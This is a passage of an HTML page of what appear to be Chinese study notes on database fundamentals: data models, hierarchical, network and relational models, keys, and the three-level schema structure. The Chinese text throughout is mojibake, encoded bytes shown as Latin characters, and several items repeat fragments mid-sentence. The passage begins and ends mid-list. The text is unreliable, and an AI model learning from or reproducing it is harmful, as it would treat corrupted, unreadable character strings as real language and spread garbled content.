<li>æ•°æ®åº“çš„å»ºç«‹å’Œç»´æŠ¤åŠŸèƒ½</li>
</ul>
</li>
</ul>
<h2 id="1-2æ•°æ®ç®¡ç†æŠ€æœ¯çš„å‘å±•"><a href="#1-2æ•°æ®ç®¡ç†æŠ€æœ¯çš„å‘å±•" class="headerlink" title="1.2æ•°æ®ç®¡ç†æŠ€æœ¯çš„å‘å±•"></a>1.2æ•°æ®ç®¡ç†æŠ€æœ¯çš„å‘å±•</h2><h4 id="æ–°ä¸€ä»£æ•°æ®åº“"><a href="#æ–°ä¸€ä»£æ•°æ®åº“" class="headerlink" title="æ–°ä¸€ä»£æ•°æ®åº“"></a><strong>æ–°ä¸€ä»£æ•°æ®åº“</strong></h4><ul>
<li>é¢å‘å¯¹è±¡çš„æ•°æ®åº“</li>
<li>åˆ†å¸ƒå¼æ•°æ®åº“</li>
<li>å¹¶è¡Œæ•°æ®åº“</li>
<li>å›¾å½¢å›¾åƒæ•°æ®åº“</li>
</ul>
<h4 id="ä¸»æµæ•°æ®åº“ï¼š"><a href="#ä¸»æµæ•°æ®åº“ï¼š" class="headerlink" title="ä¸»æµæ•°æ®åº“ï¼š"></a><strong>ä¸»æµæ•°æ®åº“ï¼š</strong></h4><p>Oracleå…¬å¸ï¼šOracleã€MySQLï¼ˆå¼€æºï¼‰</p>
<p>Microsoftå…¬å¸ï¼šMicrosoft SQL Server</p>
<p>MySQLåˆ†æ”¯ï¼šMariaDBï¼ˆå¼€æºï¼‰</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a href="https://zhuanlan.zhihu.com/p/25179862">ä¸€å›¾çœ‹æ•°æ®åº“å‘å±•å†å²</a></p>
<p><a href="https://db-engines.com/en/ranking">æ•°æ®åº“æ’å</a></p>
<h2 id="1-3æ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆ"><a href="#1-3æ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆ" class="headerlink" title="1.3æ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆ"></a>1.3æ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆ</h2><h3 id="æ•°æ®åº“ç³»ç»Ÿ"><a href="#æ•°æ®åº“ç³»ç»Ÿ" class="headerlink" title="æ•°æ®åº“ç³»ç»Ÿ"></a>æ•°æ®åº“ç³»ç»Ÿ</h3><h2 id="1-4æ¨¡å‹"><a href="#1-4æ¨¡å‹" class="headerlink" title="1.4æ¨¡å‹"></a>1.4æ¨¡å‹</h2><p><strong>æ ¹æ®åº”ç”¨ç›®çš„ï¼Œæ¨¡å‹åˆ†ä¸ºä¸¤ä¸ªå±‚æ¬¡ï¼š</strong></p>
<h4 id="æ¦‚å¿µæ¨¡å‹"><a href="#æ¦‚å¿µæ¨¡å‹" class="headerlink" title="æ¦‚å¿µæ¨¡å‹"></a><strong>æ¦‚å¿µæ¨¡å‹</strong></h4><ul>
<li>æŒ‰ç”¨æˆ·çš„è§‚ç‚¹ï¼Œç‹¬ç«‹äºè®¡ç®—æœºå®ç°çš„ï¼Œåªç”¨æ¥æè¿°å’Œç»„ç»‡æ‰€å…³å¿ƒçš„ä¿¡æ¯ç»“æ„çš„æ¦‚å¿µæ•°æ®æ¨¡å‹ï¼Œå¼ºè°ƒè¯­ä¹‰</li>
<li>æ•°æ®åº“è®¾è®¡äººå‘˜å’Œç”¨æˆ·ä¹‹é—´è¿›è¡Œäº¤æµçš„è¯­è¨€</li>
<li>å¯¹åº”äºä¿¡æ¯ä¸–ç•Œ</li>
<li>æ¦‚å¿µæ¨¡å‹ç”¨äºä¿¡æ¯ä¸–ç•Œçš„å»ºæ¨¡ï¼›</li>
<li>æ˜¯ç°å®ä¸–ç•Œåˆ°æœºå™¨ä¸–ç•Œçš„ç¬¬ä¸€å±‚æŠ½è±¡ï¼›</li>
<li>æ˜¯æ•°æ®åº“è®¾è®¡çš„æœ‰åŠ›å·¥å…·ï¼›</li>
<li>æ•°æ®åº“è®¾è®¡äººå‘˜å’Œç”¨æˆ·ä¹‹é—´è¿›è¡Œäº¤æµçš„è¯­è¨€ï¼›</li>
</ul>
<h4 id="æ•°æ®æ¨¡å‹"><a href="#æ•°æ®æ¨¡å‹" class="headerlink" title="æ•°æ®æ¨¡å‹"></a><strong>æ•°æ®æ¨¡å‹</strong></h4><ul>
<li>æŒ‰è®¡ç®—æœºç³»ç»Ÿçš„è§‚ç‚¹ï¼Œç›´æ¥é¢å‘è®¡ç®—æœºç³»ç»Ÿçš„ï¼Œæè¿°æ•°æ®åº“ä¸­æ•°æ®çš„é€»è¾‘ç»“æ„çš„åŸºæœ¬æ•°æ®æ¨¡å‹</li>
<li>å¯¹åº”äºæ•°æ®ä¸–ç•Œï¼ˆæœºå™¨ä¸–ç•Œï¼‰</li>
<li>åŒ…æ‹¬é€»è¾‘æ¨¡å‹å’Œç‰©ç†æ¨¡å‹</li>
<li>é€»è¾‘æ¨¡å‹ï¼šé‡‡ç”¨æŸä¸€æ•°æ®æ¨¡å‹ç»„ç»‡æ•°æ®ï¼Œå¦‚å…³ç³»æ¨¡å‹ã€‚</li>
<li>ç‰©ç†æ¨¡å‹ï¼šæè¿°æ•°æ®åœ¨ç³»ç»Ÿå†…éƒ¨çš„è¡¨ç¤ºæ–¹å¼å’Œå­˜å–æ–¹æ³•</li>
<li>ç”¨æ¥å½¢å¼åŒ–æè¿°<ul>
<li>æ•°æ®</li>
<li>æ•°æ®ä¹‹é—´çš„è”ç³»</li>
<li>æ•°æ®è¯­ä¹‰å’Œçº¦æŸè§„åˆ™</li>
</ul>
</li>
</ul>
<h5 id="æ•°æ®æ¨¡å‹çš„ç»„æˆè¦ç´ "><a href="#æ•°æ®æ¨¡å‹çš„ç»„æˆè¦ç´ " class="headerlink" title="æ•°æ®æ¨¡å‹çš„ç»„æˆè¦ç´ "></a><strong>æ•°æ®æ¨¡å‹çš„ç»„æˆè¦ç´ </strong></h5><ul>
<li>æ•°æ®ç»“æ„<ul>
<li><strong>æ•°æ®ç»“æ„çš„æ¦‚å¿µ</strong><ul>
<li>æè¿°æ•°æ®åº“çš„ç»„æˆå¯¹è±¡ï¼Œä»¥åŠå¯¹è±¡ä¹‹é—´çš„è”ç³»</li>
</ul>
</li>
<li><strong>æ•°æ®ç»“æ„æè¿°çš„å†…å®¹</strong><ul>
<li>å¯¹è±¡çš„æ•°æ®ç±»å‹ã€å†…å®¹ã€æ€§è´¨ï¼Œå¦‚å…³ç³»æ¨¡å‹ä¸­çš„å±æ€§</li>
<li>ä¸æ•°æ®ä¹‹é—´è”ç³»æœ‰å…³çš„å¯¹è±¡</li>
</ul>
</li>
</ul>
</li>
<li><strong>æ•°æ®æ“ä½œ</strong><ul>
<li>å¯¹æ•°æ®åº“ä¸­å„ç§å¯¹è±¡(å‹)çš„å®ä¾‹(å€¼)å…è®¸æ‰§è¡Œçš„æ“ä½œåŠæœ‰å…³çš„æ“ä½œè§„åˆ™ï¼Œæ˜¯å¯¹ç³»ç»ŸåŠ¨æ€ç‰¹æ€§çš„æè¿°</li>
<li>æ•°æ®æ“ä½œçš„ç±»å‹<ul>
<li>æŸ¥è¯¢</li>
<li>æ›´æ–°(åŒ…æ‹¬æ’å…¥ã€åˆ é™¤ã€ä¿®æ”¹)</li>
</ul>
</li>
</ul>
</li>
<li><strong>æ•°æ®çš„å®Œæ•´æ€§çº¦æŸ</strong><ul>
<li>ä¸€ç»„å®Œæ•´æ€§è§„åˆ™çš„é›†åˆã€‚</li>
<li>å®Œæ•´æ€§è§„åˆ™ï¼šç»™å®šçš„æ•°æ®æ¨¡å‹ä¸­æ•°æ®åŠå…¶è”ç³»æ‰€å…·æœ‰çš„åˆ¶çº¦å’Œä¾å­˜è§„åˆ™</li>
<li>ç”¨ä»¥é™å®šç¬¦åˆæ•°æ®æ¨¡å‹çš„æ•°æ®åº“çŠ¶æ€ä»¥åŠçŠ¶æ€çš„å˜åŒ–ï¼Œä»¥ä¿è¯æ•°æ®çš„æ­£ç¡®ã€æœ‰æ•ˆã€ç›¸å®¹ã€‚</li>
</ul>
</li>
<li><strong>æœ€å¸¸ç”¨çš„æ•°æ®æ¨¡å‹</strong><ul>
<li>éå…³ç³»æ¨¡å‹</li>
<li><strong>å±‚æ¬¡æ¨¡å‹</strong>(Hierarchical Model)<ul>
<li>å±‚æ¬¡æ¨¡å‹æ˜¯æ•°æ®åº“ç³»ç»Ÿä¸­æœ€æ—©å‡ºç°çš„æ•°æ®æ¨¡å‹</li>
<li>å±‚æ¬¡æ•°æ®åº“ç³»ç»Ÿçš„å…¸å‹ä»£è¡¨æ˜¯IBMå…¬å¸1968å¹´æ¨å‡ºçš„IMSï¼ˆInformation Management Systemï¼‰æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ</li>
<li>å±‚æ¬¡æ¨¡å‹ç”¨æ ‘å½¢ç»“æ„æ¥è¡¨ç¤ºå„ç±»å®ä½“ä»¥åŠå®ä½“é—´çš„è”ç³»</li>
<li>é€šè¿‡ é€šè¿‡æ ‘å½¢ç»“æ„è¡¨ç¤ºå®ä½“åŠè”ç³»ã€‚å¦‚æè¿°å­¦æ ¡ç®¡ç† å½¢ç»“æ„è¡¨ç¤ºå®ä½“åŠè”ç³»ã€‚å¦‚æè¿°å­¦æ ¡ç®¡ç†æœºæ„ã€‚ä¸ª æœºæ„ã€‚æ¯ä¸ªç»“ç‚¹ ç»“ç‚¹è¡¨ç¤ºä¸€ä¸ª è¡¨ç¤ºä¸€ä¸ªå®ä½“ï¼ˆå‹ï¼‰ å®ä½“ï¼ˆå‹ï¼‰ï¼Œç®­å¤´è¡¨ç¤º ç®­å¤´è¡¨ç¤ºå®ä½“ï¼ˆå‹ï¼‰é—´çš„è”ç³»ï¼ˆç”±çˆ¶åˆ°å­ï¼‰ã€‚</li>
<li>ä¸»è¦ç‰¹ç‚¹ï¼š<ul>
<li>æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ ¹ç»“ç‚¹ï¼›æ¯ä¸ªéæ ¹ç»“ç‚¹ éæ ¹ç»“ç‚¹æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªçˆ¶(ç›´æ¥ä¸Šå±‚)ç»“ç‚¹ã€‚å®ƒæœ€é€‚åˆè¡¨ç¤ºå®ä½“çš„ä¸€å¯¹å¤šè”ç³»ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><strong>ç½‘çŠ¶æ¨¡å‹</strong>(Network Model)<ul>
<li>å…¸å‹ä»£è¡¨æ˜¯DBTGç³»ç»Ÿï¼š<ul>
<li>70å¹´ä»£ç”±DBTGæå‡ºçš„ä¸€ä¸ªç³»ç»Ÿæ–¹æ¡ˆ</li>
<li>å¥ å®šäº†æ•°æ®åº“ç³»ç»Ÿçš„åŸºæœ¬æ¦‚å¿µã€æ–¹æ³•å’ŒæŠ€æœ¯</li>
</ul>
</li>
<li>å®é™…ç³»ç»Ÿ</li>
<li>Cullinet Software Inc.å…¬å¸çš„IDMS</li>
<li>Univacå…¬å¸çš„DMS1100</li>
<li>Honeywellå…¬å¸çš„IDS/2</li>
<li>HPå…¬å¸çš„IMAGE</li>
<li>é€šè¿‡ç½‘çŠ¶ç»“æ„ ç½‘çŠ¶ç»“æ„è¡¨ç¤ºå®ä½“åŠè”ç³»ã€‚â€œç½‘â€ä¸­æ¯ä¸ªç»“ç‚¹è¡¨ç¤ºä¸€ä¸ªå®ä½“(å‹)ï¼Œç»“ç‚¹ä¹‹é—´ç®­å¤´è¡¨ç¤ºå®ä½“(å‹)é—´çš„è”ç³»ã€‚</li>
<li>ç½‘çŠ¶æ•°æ®æ¨¡å‹ä¸»è¦ç‰¹ç‚¹ï¼šç½‘çŠ¶æ•°æ®æ¨¡å‹å¯èƒ½æœ‰å¤šä¸ªæ ¹ç»“ç‚¹ï¼ŒæŸäº›éæ ¹ç»“ç‚¹å¯èƒ½æœ‰å¤šä¸ªçˆ¶ç»“ç‚¹ï¼Œé€‚åˆè¡¨ç¤ºå®ä½“çš„å¤šå¯¹å¤šè”ç³»ã€‚</li>
<li>ç‰¹ç‚¹ï¼š<ul>
<li>é€‚åˆå¤æ‚çš„å…³ç³»</li>
<li>æœ€å°‘çš„æ•°æ®å†—ä½™</li>
<li>ç®—æ³•å¤æ‚ã€ä¸“ç”¨</li>
<li>ä¼˜ç‚¹ ä¼˜ç‚¹:èƒ½ç›´è§‚ã€å½¢è±¡åœ°æè¿°å®ä½“åŠå…¶è”ç³»ï¼Œæ˜“äºè¢«äººä»¬æ‰€ç†è§£å’ŒæŒæ¡ ã€‚</li>
<li>ç¼ºç‚¹ ç¼ºç‚¹:æ•°æ®ç»“æ„è¾ƒå¤æ‚ï¼Œå­˜å‚¨æ•°æ®éœ€è¦æ›´å¤šçš„é“¾æ¥æŒ‡é’ˆï¼›åœ¨æ£€ç´¢æ•°æ®æ—¶ï¼Œéœ€è¦è€ƒè™‘æ•°æ®çš„å­˜å‚¨è·¯å¾„ï¼›åœ¨æ’å…¥æˆ–åˆ é™¤æ•°æ®æ—¶ï¼Œæ¶‰åŠåˆ°è°ƒæ•´é“¾æ¥æŒ‡é’ˆ</li>
</ul>
</li>
</ul>
</li>
<li><strong>å…³ç³»æ¨¡å‹</strong>(Relational Model)<ul>
<li>1970å¹´ç¾å›½IBMå…¬å¸San Joseç ”ç©¶å®¤çš„ç ”ç©¶å‘˜E.F.Coddé¦–æ¬¡æå‡ºäº†æ•°æ®åº“ç³»ç»Ÿçš„å…³ç³»æ¨¡å‹</li>
<li>å…³ç³»æ•°æ®ç»“æ„ï¼šè§„èŒƒåŒ–çš„äºŒç»´è¡¨ äºŒç»´è¡¨ï¼ˆå…³ç³»ï¼‰</li>
<li>ä¸€ä¸ªå…³ç³»å°±æ˜¯æ²¡æœ‰é‡å¤è¡Œå’Œé‡å¤åˆ—çš„äºŒç»´è¡¨ï¼ŒäºŒç»´è¡¨çš„æ¯ä¸€è¡Œåœ¨å…³ç³»ä¸­ç§°ä¸ºå…ƒç»„ï¼Œæ¯ä¸€åˆ—åœ¨å…³ç³»ä¸­ç§°ä¸ºå±æ€§ã€‚å­¦ç”Ÿå…³ç³»çš„æ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªå­¦ç”Ÿçš„è®°å½•ï¼Œæ¯ä¸€åˆ—ä»£è¡¨å­¦ç”Ÿè®°å½•çš„ä¸€ä¸ªå­—æ®µã€‚å±æ€§ä¸ªæ•°ï¼ˆnï¼‰ç§°ä¸ºå…³ç³»çš„å…ƒã€‚</li>
<li>å…³ç³»æ¨¡å‹çš„ç»„æˆ<ul>
<li>å…³ç³»æ•°æ®ç»“æ„<ul>
<li>å•ä¸€çš„æ•°æ®ç»“æ„â€”-å…³ç³»<ul>
<li>ç°å®ä¸–ç•Œçš„å®ä½“ä»¥åŠå®ä½“é—´çš„å„ç§è”ç³»å‡ç”¨å…³ç³»æ¥è¡¨ç¤º</li>
</ul>
</li>
<li>æ•°æ®çš„é€»è¾‘ç»“æ„â€”-äºŒç»´è¡¨<ul>
<li>ä»ç”¨æˆ·è§’åº¦ï¼Œå…³ç³»æ¨¡å‹ä¸­æ•°æ®çš„é€»è¾‘ç»“æ„æ˜¯ä¸€å¼ äºŒç»´è¡¨ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>å…³ç³»æ“ä½œé›†åˆ<ul>
<li>æ’å…¥ã€åˆ é™¤ã€ä¿®æ”¹ã€æŸ¥è¯¢ï¼ˆé€‰æ‹©ã€æŠ•å½±ã€è¿æ¥ã€é™¤ã€å¹¶ã€äº¤ã€å·®</li>
</ul>
</li>
<li>å…³ç³»å®Œæ•´æ€§çº¦æŸ<ul>
<li>å®ä½“å®Œæ•´æ€§ã€å‚ç…§å®Œæ•´æ€§ã€åŸŸå®Œæ•´æ€§ã€ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§</li>
</ul>
</li>
</ul>
</li>
<li>å…³ç³»æ•°æ®åº“å°±æ˜¯ä¸€äº›ç›¸å…³çš„äºŒç»´è¡¨å’Œå…¶ä»–æ•°æ®åº“å¯¹è±¡çš„é›†åˆã€‚</li>
<li>åœ¨è¿™ä¸ªå®šä¹‰ä¸­æ˜ç¡®ï¼Œå…³ç³»æ•°æ®åº“ä¸­çš„æ‰€æœ‰ä¿¡æ¯éƒ½å­˜å‚¨åœ¨äºŒç»´è¡¨æ ¼ä¸­ï¼›ä¸€ä¸ªå…³ç³»æ•°æ®åº“å¯èƒ½åŒ…å«å¤šä¸ªè¡¨ï¼›é™¤äº†è¿™ç§äºŒç»´è¡¨å¤–ï¼Œå…³ç³»æ•°æ®åº“è¿˜åŒ…å«ä¸€äº›å…¶ä»–å¯¹è±¡ï¼Œå¦‚è§†å›¾ç­‰ã€‚</li>
<li>æ¦‚å¿µ<ul>
<li>å…³ç³»<ul>
<li>æ˜¯ä¸€å¼ äºŒç»´è¡¨ï¼Œé€šå¸¸å°†ä¸€ä¸ªæ— é‡å¤è¡Œã€é‡å¤åˆ—çš„äºŒç»´è¡¨çœ‹æˆä¸€ä¸ªå…³ç³»ï¼Œæ¯ä¸ªå…³ç³»éƒ½æœ‰ä¸€ä¸ªå…³ç³»åã€‚</li>
</ul>
</li>
<li>å…ƒç»„<ul>
<li>äºŒç»´è¡¨çš„æ¯ä¸€è¡Œåœ¨å…³ç³»ä¸­ç§°ä¸ºå…ƒç»„ã€‚æè¿°äº†ç°å®ä¸–ç•Œä¸­çš„ä¸€ä¸ªå®ä½“æˆ–ä¸åŒå®ä½“é—´çš„ä¸€ç§è”ç³»ã€‚</li>
</ul>
</li>
<li>å±æ€§<ul>
<li>äºŒç»´è¡¨çš„æ¯ä¸€åˆ—åœ¨å…³ç³»ä¸­ç§°ä¸ºå±æ€§ï¼Œæ¯ä¸ªå±æ€§éƒ½æœ‰ä¸€ä¸ªå±æ€§åï¼Œå„ä¸ªå±æ€§çš„å–å€¼ç§°ä¸ºå±æ€§å€¼ã€‚æ¯ä¸ªå±æ€§æœ‰ä¸€å®šçš„å–å€¼èŒƒå›´ï¼Œç§°ä¸ºå€¼åŸŸã€‚</li>
</ul>
</li>
<li>åŸŸ ï¼ˆDomainï¼‰<ul>
<li>å…³ç³»ä¸­æ¯ä¸ªå±æ€§çš„å€¼æ˜¯æœ‰ä¸€å®šå˜åŒ–èŒƒå›´ï¼Œæ¯ä¸€ä¸ªå±æ€§æ‰€å¯¹åº”çš„å˜åŒ–èŒƒå›´å«åšå±æ€§çš„å˜åŸŸæˆ–ç®€ç§°åŸŸï¼Œå®ƒæ˜¯å±æ€§å€¼çš„é›†åˆï¼Œå…³ç³»ä¸­æ‰€æœ‰å±æ€§çš„å®é™…å–å€¼å¿…é¡»æ¥è‡ªäºå®ƒå¯¹åº”çš„åŸŸã€‚</li>
</ul>
</li>
<li>åˆ†é‡<ul>
<li>ä¸€ä¸ªå…ƒç»„åœ¨ä¸€ä¸ªå±æ€§åŸŸä¸Šçš„å–å€¼ç§°ä¸ºè¯¥å…ƒç»„åœ¨æ­¤å±æ€§ä¸Šçš„åˆ†é‡ã€‚</li>
</ul>
</li>
<li>å…³ç³»æ¨¡å¼<ul>
<li>äºŒç»´è¡¨çš„è¡¨å¤´é‚£ä¸€è¡Œç§°ä¸ºå…³ç³»æ¨¡å¼ å…³ç³»æ¨¡å¼ï¼Œå³ä¸€ä¸ªå…³ç³»çš„å…³ç³»ååŠå…¶å…¨éƒ¨å±æ€§åçš„é›†åˆã€‚å…³ç³»æ¨¡å¼æ˜¯æ¦‚å¿µæ¨¡å‹ä¸­å®ä½“å‹åŠå®ä½“å‹ä¹‹é—´è”ç³»çš„æ•°æ®æ¨¡å‹è¡¨ç¤ºã€‚</li>
<li>ä¸€èˆ¬è¡¨ç¤ºä¸ºï¼šå…³ç³»åï¼ˆå±æ€§å1ï¼Œå±æ€§å2 ï¼Œâ€¦â€¦ï¼Œå±æ€§ånï¼‰</li>
<li>å…³ç³»æ¨¡å¼æŒ‡å‡ºäº†ä¸€ä¸ªå…³ç³»çš„ç»“æ„ï¼›è€Œå…³ç³»åˆ™æ˜¯ç”±æ»¡è¶³å…³ç³»æ¨¡å¼ç»“æ„çš„å…ƒç»„æ„æˆçš„é›†åˆã€‚å…³ç³»æ¨¡å¼æ˜¯ç¨³å®šçš„ã€é™æ€çš„ï¼Œè€Œå…³ç³»åˆ™æ˜¯éšæ—¶é—´å˜åŒ–çš„ã€åŠ¨æ€çš„ã€‚</li>
</ul>
</li>
<li>å€™é€‰ç <ul>
<li>è‹¥å…³ç³»ä¸­çš„æŸä¸€å±æ€§æˆ–å±æ€§ç»„åˆçš„å€¼èƒ½å”¯ä¸€åœ°æ ‡è¯†ä¸€ä¸ªå…ƒç»„ï¼Œåˆ™ç§°è¯¥å±æ€§ç»„ä¸ºå€™é€‰ç </li>
<li>åœ¨æœ€ç®€å•çš„æƒ…å†µä¸‹ï¼Œå€™é€‰ç åªåŒ…å«ä¸€ä¸ªå±æ€§ã€‚</li>
<li>åœ¨æœ€æç«¯çš„æƒ…å†µä¸‹ï¼Œå…³ç³»æ¨¡å¼çš„æ‰€æœ‰å±æ€§ç»„æ˜¯è¿™ä¸ªå…³ç³»æ¨¡å¼çš„å€™é€‰ç ï¼Œç§°ä¸ºå…¨ç ï¼ˆAll-keyï¼‰</li>
</ul>
</li>
<li>ä¸»ç ï¼ˆä¸»é”®ï¼‰ï¼ˆPrimary keyï¼‰<ul>
<li>è‹¥ä¸€ä¸ªå…³ç³»æœ‰å¤šä¸ªå€™é€‰ç ï¼Œåˆ™é€‰å®šå…¶ä¸­ä¸€ä¸ªä¸ºä¸»ç ï¼ˆPrimary keyï¼‰</li>
<li>ä¸»ç çš„å„ä¸ªå±æ€§ç§°ä¸ºä¸»å±æ€§ï¼ˆPrime attributeï¼‰</li>
<li>ä¸åŒ…å«åœ¨ä»»ä½•ä¾¯é€‰ç ä¸­çš„å±æ€§ç§°ä¸ºéä¸»å±æ€§ï¼ˆNon-key attributeï¼‰</li>
</ul>
</li>
<li>å¤–ç ï¼ˆå¤–é”®ï¼‰(Foreign Key)<ul>
<li>å¦‚æœå…³ç³»ä¸­æŸä¸ªå±æ€§æˆ–å±æ€§ç»„åˆå¹¶éç ï¼Œä½†å´æ˜¯å¦ä¸€ä¸ªå…³ç³»çš„ä¸»ç ï¼Œåˆ™ç§°æ­¤å±æ€§æˆ–å±æ€§ç»„åˆä¸ºæœ¬å…³ç³»çš„å¤–ç æˆ–å¤–é”®(Foreign Key)ã€‚åœ¨å…³ç³»æ•°æ®åº“ä¸­ï¼Œç”¨å¤–ç è¡¨ç¤ºä¸¤ä¸ªè¡¨é—´çš„è”ç³»ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>åŸºæœ¬ç‰¹å¾<ul>
<li>æœ‰åšå®çš„ç†è®ºåŸºç¡€ ï¼ˆå…³ç³»ä»£æ•°ï¼‰<ul>
<li>å‡ ä¸ªå…ƒç´ ç»„æˆçš„ä¸€ä¸ªæœ‰åºç»„ç§°ä¸ºä¸€ä¸ªå…ƒç»„ï¼Œé€šå¸¸å…ƒç»„æ˜¯ç”¨åœ†æ‹¬å·æ‹¬èµ·æ¥çš„ä¸€äº›å…ƒç´ è¡¨ç¤ºï¼Œå…ƒç´ é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚ ä¾‹å¦‚ (E001,é’±è¾¾ç†,ç”·,ä¸œé£è·¯78å·)æ˜¯å…ƒç»„çš„ä¾‹å­ã€‚</li>
<li>åœ¨å…³ç³»æ•°æ®åº“ä¸­ï¼Œå¯ä»¥æŠŠä¸€ä¸ªè¡¨çš„æ¯ä¸€è¡Œçœ‹ä½œä¸€ä¸ªå…ƒç»„ã€‚</li>
</ul>
</li>
<li>æ•°æ®ç»“æ„ç®€å•ã€æ˜“äºç†è§£</li>
<li>å¯¹ç”¨æˆ·æä¾›äº†è¾ƒå…¨é¢çš„æ“ä½œæ”¯æŒ</li>
<li>å¾—åˆ°äº†ä¼—å¤šå¼€å‘å•†çš„æ”¯æŒ</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-5æ•°æ®åº“ç³»ç»Ÿç»“æ„"><a href="#1-5æ•°æ®åº“ç³»ç»Ÿç»“æ„" class="headerlink" title="1.5æ•°æ®åº“ç³»ç»Ÿç»“æ„"></a>1.5æ•°æ®åº“ç³»ç»Ÿç»“æ„</h2><h4 id="æ¦‚å¿µæ¨¡å‹çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³•"><a href="#æ¦‚å¿µæ¨¡å‹çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³•" class="headerlink" title="æ¦‚å¿µæ¨¡å‹çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³•"></a>æ¦‚å¿µæ¨¡å‹çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³•</h4><ul>
<li>æ•°æ®åº“ç³»ç»Ÿå†…éƒ¨ç»“æ„<ul>
<li>ä»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿè§’åº¦çœ‹ï¼Œæ•°æ®åº“ç³»ç»Ÿé€šå¸¸é‡‡ç”¨ä¸‰çº§æ¨¡å¼ç»“æ„ï¼Œæ˜¯æ•°æ®åº“ç³»ç»Ÿå†…éƒ¨çš„ç³»ç»Ÿç»“æ„</li>
</ul>
</li>
<li>æ•°æ®åº“ç³»ç»Ÿå¤–éƒ¨ç»“æ„<ul>
<li>ä»æ•°æ®åº“æœ€ç»ˆç”¨æˆ·è§’åº¦çœ‹ï¼Œæ•°æ®åº“ç³»ç»Ÿçš„ç»“æ„åˆ†ä¸º:å•ç”¨æˆ·ç»“æ„ï¼›å®¢æˆ·/æœåŠ¡å™¨ç»“æ„ï¼›æµè§ˆå™¨ï¼åº”ç”¨æœåŠ¡å™¨ï¼æ•°æ®åº“æœåŠ¡å™¨å¤šå±‚ç»“æ„ç­‰ã€‚</li>
</ul>
</li>
</ul>
<h4 id="æ•°æ®åº“ç³»ç»Ÿçš„ä¸‰çº§æ¨¡å¼ç»“æ„"><a href="#æ•°æ®åº“ç³»ç»Ÿçš„ä¸‰çº§æ¨¡å¼ç»“æ„" class="headerlink" title="æ•°æ®åº“ç³»ç»Ÿçš„ä¸‰çº§æ¨¡å¼ç»“æ„"></a>æ•°æ®åº“ç³»ç»Ÿçš„ä¸‰çº§æ¨¡å¼ç»“æ„</h4><ul>
<li><p>ä¸ºäº†æœ‰æ•ˆåœ°ç»„ç»‡ã€ç®¡ç†æ•°æ®ï¼Œæé«˜æ•°æ®åº“çš„é€»è¾‘ç‹¬ç«‹æ€§å’Œç‰©ç†ç‹¬ç«‹æ€§ï¼Œäººä»¬ä¸ºæ•°æ®åº“è®¾è®¡äº†ä¸€ä¸ªä¸¥è°¨çš„ä½“ç³»ç»“æ„ï¼Œæ•°æ®åº“é¢†åŸŸå…¬è®¤çš„æ ‡å‡†ç»“æ„æ˜¯ä¸‰çº§æ¨¡å¼ç»“æ„ï¼Œå³å¤–æ¨¡å¼ã€æ¨¡å¼å’Œå†…æ¨¡å¼ ã€‚</p>
</li>
<li><p>æ ¹æ®å„ç±»äººå‘˜ä¸æ•°æ®åº“çš„ä¸åŒå…³ç³»ï¼Œå¯æŠŠè§†å›¾åˆ†ä¸ºä¸‰ç§</p>
<ul>
<li>å¯¹åº”äºç”¨æˆ·çš„å¤–éƒ¨è§†å›¾</li>
<li>å¯¹åº”äºåº”ç”¨ç¨‹åºå‘˜çš„æ¦‚å¿µè§†å›¾</li>
<li>å¯¹åº”äºç³»ç»Ÿç¨‹åºå‘˜çš„å†…éƒ¨è§†å›¾</li>
</ul>
</li>
<li><p>æ¨¡å¼ï¼ˆSchemaï¼Œä¹Ÿç§°é€»è¾‘æ¨¡å¼ï¼‰</p>
<ul>
<li><p>æ•°æ®åº“ä¸­å…¨ä½“æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°</p>
</li>
<li><p>æ‰€æœ‰ç”¨æˆ·çš„å…¬å…±æ•°æ®è§†å›¾ï¼Œç»¼åˆäº†æ‰€æœ‰ç”¨æˆ·çš„éœ€æ±‚</p>
</li>
<li><p>ä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªæ¨¡å¼</p>
</li>
<li><p>æ¨¡å¼çš„åœ°ä½</p>
<p>ï¼šæ˜¯æ•°æ®åº“ç³»ç»Ÿæ¨¡å¼ç»“æ„çš„ä¸­é—´å±‚</p>
<ul>
<li>ä¸æ•°æ®çš„ç‰©ç†å­˜å‚¨ç»†èŠ‚å’Œç¡¬ä»¶ç¯å¢ƒæ— å…³</li>
<li>ä¸å…·ä½“çš„åº”ç”¨ç¨‹åºã€å¼€å‘å·¥å…·åŠé«˜çº§ç¨‹åºè®¾è®¡è¯­è¨€æ— å…³</li>
</ul>
</li>
</ul>
</li>
<li><p>å¤–æ¨¡å¼</p>
<ul>
<li>ä¹Ÿç§°å­æ¨¡å¼æˆ–ç”¨æˆ·æ¨¡å¼</li>
<li>æ•°æ®åº“ç”¨æˆ·ï¼ˆåŒ…æ‹¬åº”ç”¨ç¨‹åºå‘˜å’Œæœ€ç»ˆç”¨æˆ·ï¼‰ä½¿ç”¨çš„å±€éƒ¨æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°</li>
<li>æ•°æ®åº“ç”¨æˆ·çš„æ•°æ®è§†å›¾ï¼Œæ˜¯ä¸æŸä¸€åº”ç”¨æœ‰å…³çš„æ•°æ®çš„é€»è¾‘è¡¨ç¤º</li>
<li><strong>å¤–æ¨¡å¼çš„åœ°ä½ï¼š</strong>ä»‹äºæ¨¡å¼ä¸åº”ç”¨ä¹‹é—´</li>
